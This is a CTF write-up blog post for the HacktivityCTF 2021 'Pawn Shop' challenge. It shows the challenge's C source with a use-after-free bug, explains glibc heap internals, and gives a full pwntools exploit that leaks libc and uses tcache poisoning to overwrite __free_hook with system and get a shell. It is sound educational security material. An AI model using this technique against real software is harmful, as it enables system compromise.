---
layout: post
title: HacktivityCTF 2021 pawn shop challenge writeup
date: 2021-09-28 21:02
category: writeup
author: stdnoerr
tags: [heap, uaf]
summary: Writeup for pawn shop heap challenge in HacktivityCTF 2021
---
This is writeup for `Pawn Shop` challenge from HacktivityCTF 2021. This challenge is good for getting started with heap exploitation and similar/identical challenge are commonly seen in CTFs. You can download the challenge files [here]().

# Analysis
## Source Code Analysis
Source code was not avaible during the CTF, but for the purpose of this writeup, I asked the author to give me the source code. Below is the source code: -
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ITEM_LIST_SIZE 10
#define BUF_LEN 8

typedef struct {
    double price;
    size_t padding;
    char *name;
    int item_name_size;
} item_entry_t;

int print_items(item_entry_t *items[ITEM_LIST_SIZE]);

__attribute__((constructor))
void setup() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
}

void sell_item(item_entry_t *items[ITEM_LIST_SIZE]) {
    int idx;

    for (idx = 0; idx < ITEM_LIST_SIZE; idx++) {
        if (items[idx] == NULL) {
            break;
        }
    }

    if (idx == ITEM_LIST_SIZE) {
        puts("Shop is full. Please come back again later.\n");
        return;
    }

    items[idx] = malloc(sizeof(item_entry_t)); // 0x20
    if (items[idx] == NULL) {
        puts("Failed to add item.\n");
        return;
    }

    printf("Enter item price: ");
    scanf(" %lf", &(items[idx]->price));
    getchar();

    printf("Enter length of the item name: ");
    scanf(" %d", &(items[idx]->item_name_size));
    getchar();

    items[idx]->name = malloc(items[idx]->item_name_size);
    if (items[idx]->name == NULL) {
        free(items[idx]);
        items[idx] = NULL;
        puts("Failed to add item.\n");
        return;
    }

    printf("Enter the name of the item: ");

    fgets(items[idx]->name, items[idx]->item_name_size, stdin);
    items[idx]->name[strcspn(items[idx]->name, "\r\n")] = 0;

    puts("Item added.\n");
}

void buy_item(item_entry_t *items[ITEM_LIST_SIZE]) {
    char buffer[BUF_LEN];
    int choice;
    int item_num;

    item_num = print_items(items);
    if (item_num == 0) {
        return;
    }

    printf("What item would you like to buy?: ");
    fgets(buffer, BUF_LEN, stdin);

    choice = atoi(buffer) - 1;

    if (choice < 0 || choice > ITEM_LIST_SIZE || items[choice] == NULL) {
        puts("Invalid option.\n");
        return;
    }

    free(items[choice]->name);
    free(items[choice]);

    puts("Item bought.\n");
}

int print_items(item_entry_t *items[ITEM_LIST_SIZE]) {
    int print_num = 1;

    for (int i = 0; i < ITEM_LIST_SIZE; i++) {
        if (items[i] == NULL) { continue; }
        if (items[i]->name == NULL) { continue; }

        printf("%d. Price $%lf, Name: %s\n",
                print_num, items[i]->price, items[i]->name);

        print_num++;
    }
    print_num--;

    if (print_num == 0) {
        puts("No items for sale.\n");
    } else {
        puts("");
    }

    return print_num;
}

void manage_items(item_entry_t *items[ITEM_LIST_SIZE]) {
    int item_num;
    int choice;
    int item_len;
    char buffer[BUF_LEN];

    puts("WARNING! Admin use only!!!\n");

    if ((item_num = print_items(items)) == 0) {
        return;
    }

    printf("What item would you like to change?: ");
    fgets(buffer, BUF_LEN, stdin);

    choice = atoi(buffer) - 1;

    if (choice < 0 || choice > ITEM_LIST_SIZE || items[choice] == NULL) {
        puts("Invalid option.\n");
        return;
    }

    if (items[choice]) {
        printf("Enter the new item price: ");
        scanf(" %lf", &(items[choice]->price));
        getchar();

        printf("Enter the new item name length: ");
        if (scanf(" %d", &item_len) != 1) {
            puts("Invalid item name length.\n");
            return;
        }
        getchar();

        if (item_len != items[choice]->item_name_size) {
            items[choice]->item_name_size = item_len;
            free(items[choice]->name);
            items[choice]->name = NULL;

            items[choice]->name = malloc(items[choice]->item_name_size);
            if (items[choice]->name == NULL) {
                puts("Failed to resize item name.\n");
                return;
            }

            printf("Enter the new name of the item: ");

            fgets(items[choice]->name, items[choice]->item_name_size, stdin);
            items[choice]->name[strcspn(items[choice]->name, "\r\n")] = 0;
        } else {
            printf("Enter the new name of the item: ");

            fgets(items[choice]->name, items[choice]->item_name_size, stdin);
            items[choice]->name[strcspn(items[choice]->name, "\r\n")] = 0;
        }

    } else {
        puts("Invalid item.\n");
    }

    puts("Item changed.\n");
}


int main() {
    item_entry_t *items[ITEM_LIST_SIZE];
    _Bool cont = 1;
    char input = 0;

    memset(items, 0, sizeof(items));

    puts("Welcome to the Pawn Shop!\n");

    while (cont) {
        puts("[B]uy item.");
        puts("[S]ell item.");
        puts("[L]eave shop.");
        puts("[P]rint items for sale.");
        printf("> ");

        scanf(" %c", &input);
        getchar();

        input -= (input >= 'a') ? 32 : 0;

        switch (input) {
            case 'B':
                buy_item(items);
                break;

            case 'S':
                sell_item(items);
                break;

            case 'L':
                cont = 0;
                break;

            case 'M':
                manage_items(items);
                break;

            case 'P':
                print_items(items);
                break;

            default:
                puts("Invalid option.");
                break;
        }

        input = 0;
    }

    puts("Thank you for shopping at the Pawn Shop! Hope to see you again soon.");

    return 0;
}
```
The program presents us with a menu for managing a list of items. Each item has a structure named `item_entry_t`. Each item has `price`, `name`, `item_name_size` and `padding`. We can add item using `sell_item`, remove item using `buy_item`, view items using `print_items` and edit item using `manage_items` functions respectively, `manage_items` option is not in the menu. If you look closely, the pointer to item is not nulled out when an item is freed. Hence, a use-after-free (UAF) vulnerability, because the program will continue to use the pointer after it is freed.

## Checksec
Typically, in heap challenges, all protections are enabled. But, still, checking is good practice.
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

# Background Knowledge
Lets learn a bit about the heap internals before diving into its exploitation. I will only explain things required to understand this writeup. This explanation is about glibc heap which uses ptmalloc2.

## What is a chunk?
In ptmalloc2 terminology, a chunk is the memory area in heap which is used to serve a `malloc` call.<br>
They have the following structure:
```c
struct malloc_chunk {

  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```
A chunk has following structure in memory when it is returned to user: -
```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk   (if freed)               |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                           |
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (size of this area varies)                        .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |       (size of chunk, but used for application data)          |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                      |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```
When it is freed, it has the following structure: -
```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk   (if freed)               |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                           |
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .             More pointers are stored for big chunks           .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                      |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```
The memory used by chunks is allocated on first call to `malloc`. It is done by either `brk` or `mmap` syscall.<br>
The pointers returned by malloc point to start of the `mem` region. Data before that is called chunk metadata and is used internally. Because of this metadata, the actual size of chunk is `size_requested+0x10` on 64-bit machine.<br>
The memory is given from the what is called `wilderness` or `top chunk`. It represents the remaining memory of heap. It is at end of all chunks.

## What is a bin?
When the pointer returned by `malloc` is passed to `free`, ptmalloc2 stores them in single/doubly linked list for future. These lists are called bins. There are separate bins based upon chunk sizes. Based upon size, chunks were divided into three categories before glibc 2.27.
1. Fast chunks  (size: 0x20 to 0x80)
2. Small chunks (size: 0x80 to 0x410)
3. Large chunks (size: above 0x410)

## Thread cache - Tcache
In glibc 2.27, tcache was introduced. This was done to give each thread a dedicated heap area for most common chunk sizes, so the allocator doesn't has to acquire lock before doing anything on tcache. Tcache is based on struct named `tcache_perthread_struct`.
It has `64` bins for chunks of size in `0x20-0x410` range. Each bin is a singly-linked list which can hold upto `7` entries. Each entry has a structure `tcache_entry`. The structures are taken from glibc 2.31 source: -
```c
# define TCACHE_MAX_BINS		64

typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;

typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```
If a chunk of size between `0x20-0x410` is freed and tcachebin of that size is full then the chunk goes into its corresponding non-tcache bin.

## Unsorted Bin
Unsorted bin is a special bin. It holds chunks which correspond to smallbin and largebin. When a small chunk or large chunk is freed, it's first put into unsorted bin. It is done to use these chunks to serve future `malloc` requests so the allocator does not have to put the chunk in correct bin and then replace it in case some part of this chunk is used to serve a `malloc` request. But, if you do a big allocation which is not satisfiable by any chunk in unsorted bin then these chunks are put into corresponding small bin and large bin and then the request is served using the top chunk.<br>
We are interested in unsorted bin because it is a doubly-linked list in glibc and it holds libc pointers. First chunk in the list has libc pointer in `bk` (+0x18) and last chunk has libc pointer in `fd` (+0x10). If there's only one chunk in unsorted bin then both `fd` and `bk` will have libc pointers. These pointers point to `main_arena+96` in libc having tcache.<br>
We will use this feature/behaviour of unsorted bin for getting libc leak.

# Exploitation
While doing heap exploitation challenges, it is advisible to make dedicated functions for each option of the menu. I also like to make an indexing mechanism like the one used in the program, so I don't have to remember indices. Following are my wrapper functions: -
```py
#!/usr/bin/env python3
from pwn import *

indexes = [False]*11

def start():
    global p
    if args.REMOTE:
        p = remote('challenge.ctf.games', 31561)
    else:
        p = elf.process(env = {"LD_PRELOAD": libc.path})

def attach_gdb():
    if args.REMOTE or args.NOGDB:
        return
    
    attach(p, '''
    // for gdb-gef
    heap chunks
    heap bins
    continue
    ''')
    input("ATTACHED?")

def b2f(data):
    return str(struct.unpack('<d', data)[0])

def i2f(n):
    return b2f(p64(n))

def sendchoice(choice: str):
    p.sendlineafter('> ', choice)

def buy_item(index: int):
    sendchoice('B')

    p.sendlineafter('buy?: ', str(index))

def manage_item(index: int, new_name: bytes = b'stdnoerr', new_price: int = 123, new_len: int = 0x80):
    sendchoice('M')

    p.sendlineafter('?: ', str(index))
    p.sendlineafter(': ', i2f(new_price) if type(new_price) == int else new_price)
    p.sendlineafter(': ', str(new_len))
    p.sendlineafter(': ', new_name)

def sell_item(name: bytes, price: int = 123, name_len: int = 0x80):
    sendchoice('S')

    p.sendlineafter(': ', i2f(price))
    p.sendlineafter(': ', str(name_len))
    p.sendlineafter(': ', name)

    if indexes.count(False) > 0:
        ret = indexes.index(False)
        indexes[ret] = True
        return ret + 1
    
    else:
        raise Exception("No index available")

def leave():
    sendchoice('L')

def print_items():
    sendchoice('P')

context.binary = elf = ELF('./pawned')
libc = ELF('./libc_2.31.so')
start()

p.interactive()
p.close()
```
## The plan
Our objective is to get a shell. In heap exploitation, it is done by overwriting one/few of `__malloc_hook`, `__free_hook`, `__realloc_hook` etc with `system` or `one gadget`. Because, these functions are used in the program and the overwritten value will be called on each invocation of the corresponding function.<br>
For this, we need an arbitrary write primitive and a libc leak. So, exploitations steps are: -
1. Get libc leak
2. Overwrite any hook with `system` or `one gadget`

## Getting libc leak
As I explained earlier, for libc leak, we use unsorted bin. As the program has a UAF vulnerability, just putting a chunk in unsorted bin is enough because we can read the libc pointers using the `print_items` option.<br>
To put a chunk in unsorted bin, we first need to fill tcache of the chunk's size, so it doesn't end up in tcachebin. Moreover, the chunk should have (actual) size greater than or equal to `0x90`, otherwise the chunk will end up in fastbin and we won't get libc leak.<br>
I chose `0x90` for libc leak (passing `0x80` will give a `0x90` sized chunk). Lets fill tcachebin of this size.<br>
For this, you just need to allocate `7` chunks and free them. Be careful, don't allocate a chunk and immediately free it because you will end up allocating and freeing the same chunk. Just allocate `7` chunks and free them later.
```py
tcache = [sell_item(str(i)*8) for i in range(7)]

for i in tcache: buy_item(i)
```
This fills tcachebin for size `0x90`.
```
Tcachebins[idx=1, size=0x30] count=7  ←  Chunk(addr=0x56207bb2a720, size=0x30, flags=PREV_INUSE)  ←  [...]                  
Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x56207bb2a750, size=0x90, flags=PREV_INUSE)  ←  [...]
```
Now, we need another chunk for putting into unsorted bin. Maybe allocate a chunk just after the ones used for tcachebin filling.
```py
tcache = [sell_item(str(i)*8) for i in range(7)]
a = sell_item('stdnoerr')

for i in tcache: buy_item(i)
buy_item(a)
```
```
Tcachebins[idx=1, size=0x30] count=7  ←  [...]                                          
Tcachebins[idx=7, size=0x90] count=7  ←  [...]
───────────────── Fastbins for arena 0x7f26bce21b80 ─────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x55f7e41897e0, size=0x30, flags=PREV_INUSE) 
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────── Unsorted Bin for arena '*0x7f26bce21b80' ─────────────────
[+] Found 0 chunks in unsorted bin.
───────────────── Small Bins for arena '*0x7f26bce21b80'   ─────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────── Large Bins for arena '*0x7f26bce21b80'   ─────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```
Hmmm. There's no chunk in unsortebin. But, there's a chunk in fastbin. It means the free worked but our `0x90` size chunk vanished.<br>
Actually, the chunk got consolidated into `top chunk`. Whenever a chunk is to be put in unsortebin, it is checked that whether the chunk is adjacent to `top chunk` or not. If it is, like in this case, it gets consolidated (merged) into `top chunk`. Below code is responsible for this behaviour: -
```c
if (nextchunk != av->top) {
    [...]
/*
    If the chunk borders the current high end of memory,
    consolidate into top
*/
else {
    size += nextsize;
    set_head(p, size | PREV_INUSE);
    av->top = p;
    check_chunk(av, p);
}
```
To prevent this, you can allocate another chunk or allocate the chunk to be put in unsortebin at start.<br>
I chose the latter. Just move the allocation above the tcache ones.
```py
a = sell_item('stdnoerr')
tcache = [sell_item(str(i)*8) for i in range(7)]

for i in tcache: buy_item(i)
buy_item(a)
```
```
Tcachebins[idx=1, size=0x30] count=7  ←  [...]                                                    
Tcachebins[idx=7, size=0x90] count=7  ←  [...]                                          
───────────────── Fastbins for arena 0x7ffaf420db80 ─────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x5579d7edb2a0, size=0x30, flags=PREV_INUSE) 
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────── Unsorted Bin for arena '*0x7ffaf420db80' ─────────────────
[+] unsorted_bins[0]: fw=0x5579d7edb2c0, bk=0x5579d7edb2c0
 →   Chunk(addr=0x5579d7edb2d0, size=0x90, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────── Small Bins for arena '*0x7ffaf420db80'  ─────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────── Large Bins for arena '*0x7ffaf420db80'  ─────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```
Now, we just need to read the pointer(s) using `print_items` option. You can calculate libc offset in gdb and use that to calculate libc base address.
```py
a = sell_item('stdnoerr')
tcache = [sell_item(str(i)*8) for i in range(7)]

for i in tcache: buy_item(i)
buy_item(a)

print_items()
p.recvuntil('Name: ')
libc_leak = u64(p.recvline(False).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1ebbe0 # main_arena + 96
```
Now that we have calculated the libc base address, we have addresses of `__malloc_hook`, `__free_hook` etc. You just have to decide which one you want to overwrite.<br>
I like to overwrite `__free_hook` with `system` and free a chunk with `/bin/sh` in it because it gives a stable method and you don't have to satisfy any constraints for `one gadget`.<br>
To overwrite `__free_hook`, we will do what is known as tcache poisoning/tcache dup attack, more commonly known as the former.

## Tcache poisoning attack
This attack is used to make `malloc` return arbitrary pointer, effectively giving us write-what-where primitive.<br>
This attack is based on the way tcachebin lists work. It is a singly-linked list. It means that it holds a reference to next chunk in list (in `next`/`fd`). It follows Last-In-First-Out (LIFO) mechanism, meaning the last chunk which was freed and was put in tcachebin will the first one to be returned when a chunk of its size is requested.<br>
Lets take an example. Consider the following code: -
```c
void* a = malloc(8); // this will give us 0x20 sized chunk
void* b = malloc(8);

free(a); // [1]
free(b); // [2]

void* c = malloc(8); // [3]
```
At [1], tcachebin for `0x20` sized chunks will look like this:
```
tcachebin[0x20]: a -> 0x0
```
Chunks are added and removed at/from head of the list (LIFO). At [2], the tcachebin will look like this:
```
tcachebin[0x20]: b -> a -> 0x0
```
Now, when we request a chunk of size `8` ([3]), it will be served using the tcachebin and `b` will be removed from the list and list will get back to its previous state:
```
tcachebin[0x20]: a -> 0x0
```
When you check the source code, the code responsible for removing chunk from tcachebin is a function named `tcache_get`.
```c
/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;
  return (void *) e;
}
```
Here `tc_idx` is index of the tcachebin/list from which chunk is to be removed.<br>
Notice that there are no checks on the pointer to be returned, whether it points to a valid chunk or not. This is the base of tcache poisoning attack, that they are no checks on the pointer unlike fastbin, smallbin or largebin.<br>
So, if we could somehow overwrite the `next` pointer value, we can get an arbitrary pointer.

Because of the UAF, we can change `next` pointer. I overwrite `next` pointer of `tcache[-1]` (remember LIFO) by changing its `name` to address of `__free_hook` using `manage_items` function. This will return us `__free_hook` through `tcachebin[0x90]`.
```py
a = sell_item('stdnoerr')
tcache = [sell_item(str(i)*8) for i in range(7)]

for i in tcache: buy_item(i)
buy_item(a)

print_items()
p.recvuntil('Name: ')
libc_leak = u64(p.recvline(False).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1ebbe0 # main_arena + 96

manage_item(tcache[-1], p64(libc.sym.__free_hook))
```
Weirdly, tcachebins end up being the following:
```
Tcachebins[idx=1, size=0x30] count=7  ←  Chunk(addr=0x556d29f1f7e0, size=0x30, flags=PREV_INUSE)  ←  [Corrupted chunk at 0x7b]
Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x556d29f1f810, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x7f93dfbf7b28, size=0x0, flags=) <--- __free_hook
```
If you notice, `tcachebin[0x30]` contains an invalid `next` pointer. This will make the programm `SEGFAULT`, because on second allocation it will return `0x7b` (123) and the program will try to write values there, but since it is an invalid pointer, the program will `SEGFAULT`. This value is the one we used for `new_price` in `manage_items` function.<br>
To prevent this from happening, you can use a valid pointer as `new_price` (libc free area, some heap area etc). But, since the program reads `price` using `scanf`, you can use a small `scanf` trick to preserve the original value.<br>
The trick is, whenever `scanf` is instructed to read a number (`int`/`float`/`double` etc) if it receives non-numeric input, it doesn't alter the destination value, so the destination value remains same. The responsible code for this is a little complex, but the gist is `scanf` calls `strtod`/`strtold`/`stdtof` to convert the recevied input to the actual value (`double`/`long double`/`float`). When these function receive an input which doesn't correspond to an actual value, they write the same input to output buffer and `scanf` checks if it's **not** the case, only then the value is written.<br>
This means giving a simple string like `stdnoerr` will not change the destination value. But it is better to use a single character instead of a string. A small snippet where the check is performed is below:
```c
long double d = __strtold_internal
    (char_buffer_start (&charbuf), &tw, flags & GROUP); // strtold
if (!(flags & SUPPRESS) && tw != char_buffer_start (&charbuf)) // the second part is 
   *ARG (long double *) = d;                                   // the culprit
```
So, the following code will resolve the problem.
```py
a = sell_item('stdnoerr')
tcache = [sell_item(str(i)*8) for i in range(7)]

for i in tcache: buy_item(i)
buy_item(a)

print_items()
p.recvuntil('Name: ')
libc_leak = u64(p.recvline(False).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1ebbe0 # main_arena + 96

manage_item(tcache[-1], p64(libc.sym.__free_hook), new_price = 's')
```
```
Tcachebins[idx=1, size=0x30] count=7  ←  Chunk(addr=0x5591a4d067e0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5591a4d06720, size=0x30, flags=PREV_INUSE)  ←  [...]
Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x5591a4d06810, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x7fa53fa4bb28, size=0x0, flags=) <--- __free_hook
```
Now, we just need to make an allocation to put `__free_hook` on head and then do another allocation to overwrite `__free_hook`. I used the first allocation to store `/bin/sh` string.
```py
bin_sh = sell_item('/bin/sh')
sell_item(p64(libc.sym.system))
```
I put `/bin/sh` in `name` because `name` member is freed first. Now, we just need to free the chunk containing `/bin/sh`. Just add the following line:
```py
buy_item(bin_sh)
```
And... you get a shell!

# Final exploit
```py
#!/usr/bin/env python3
from pwn import *

indexes = [False]*11

def start():
    global p
    if args.REMOTE:
        p = remote('challenge.ctf.games', 31561)
    else:
        p = elf.process(env = {"LD_PRELOAD": libc.path})

def attach_gdb():
    if args.REMOTE or args.NOGDB:
        return
    
    attach(p, '''
    // for gdb-gef
    heap chunks
    heap bins
    continue
    ''')
    input("ATTACHED?")

def b2f(data):
    return str(struct.unpack('<d', data)[0])

def i2f(n):
    return b2f(p64(n))

def sendchoice(choice: str):
    p.sendlineafter('> ', choice)

def buy_item(index: int):
    sendchoice('B')

    p.sendlineafter('buy?: ', str(index))

def manage_item(index: int, new_name: bytes = b'stdnoerr', new_price: int = 123, new_len: int = 0x80):
    sendchoice('M')

    p.sendlineafter('?: ', str(index))
    p.sendlineafter(': ', i2f(new_price) if type(new_price) == int else new_price)
    p.sendlineafter(': ', str(new_len))
    p.sendlineafter(': ', new_name)

def sell_item(name: bytes, price: int = 123, name_len: int = 0x80):
    sendchoice('S')

    p.sendlineafter(': ', i2f(price))
    p.sendlineafter(': ', str(name_len))
    p.sendlineafter(': ', name)

    if indexes.count(False) > 0:
        ret = indexes.index(False)
        indexes[ret] = True
        return ret + 1
    
    else:
        raise Exception("No index available")

def leave():
    sendchoice('L')

def print_items():
    sendchoice('P')

context.binary = elf = ELF('./pawned')
libc = ELF('./libc_2.31.so')
start()

a = sell_item('stdnoerr')
tcache = [sell_item(str(i)*8) for i in range(7)]

for i in tcache: buy_item(i)
buy_item(a)

print_items()
p.recvuntil('Name: ')
libc_leak = u64(p.recvline(False).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1ebbe0 # main_arena + 96

manage_item(tcache[-1], p64(libc.sym.__free_hook), new_price = 's')

bin_sh = sell_item('/bin/sh')
sell_item(p64(libc.sym.system))

buy_item(bin_sh)

p.interactive()
p.close()
```

Lastly, if you have any questions/doubts, please ping me on discord `stdnoerr#7880`. I will be happy to discuss.
